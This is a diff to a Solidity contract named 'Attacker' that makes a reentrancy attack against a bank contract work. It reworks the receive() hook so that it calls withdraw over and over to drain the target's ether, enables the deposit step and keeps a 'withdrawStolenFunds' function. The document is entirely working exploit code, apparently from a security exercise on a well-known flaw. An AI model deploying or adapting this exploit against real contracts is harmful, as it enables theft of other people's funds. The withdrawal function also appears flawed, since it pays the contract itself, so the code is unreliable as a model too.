@@ -9,30 +9,25 @@ interface IeBank {
 
 contract Attacker {
     IeBank targetContract;
+    uint256 private constant ETHER_AMOUNT = 1 ether;
 
     constructor(address target) {
         targetContract = IeBank(target);
     }
 
-    fallback() external {
-        if (address(targetContract).balance >= 1 ether) {
-            targetContract.withdraw(1 ether);
+    receive() external payable {
+        if (address(targetContract).balance >= ETHER_AMOUNT) {
+            targetContract.withdraw(ETHER_AMOUNT);
         }
     }
 
     function attack() external payable {
-        require(msg.value >= 1 ether);
-        // targetContract.deposit{value: 1 ether}();
-        targetContract.withdraw(1 ether);
+        require(msg.value >= ETHER_AMOUNT);
+        targetContract.deposit{value: 1 ether}();
+        targetContract.withdraw(ETHER_AMOUNT);
     }
 
     function withdrawStolenFunds() public {
         payable(address(this)).transfer(address(this).balance);
-    }
-
-    receive() external payable {
-        if (address(targetContract).balance > 0) {
-            targetContract.withdraw(address(targetContract).balance);
-        }
     }
 }
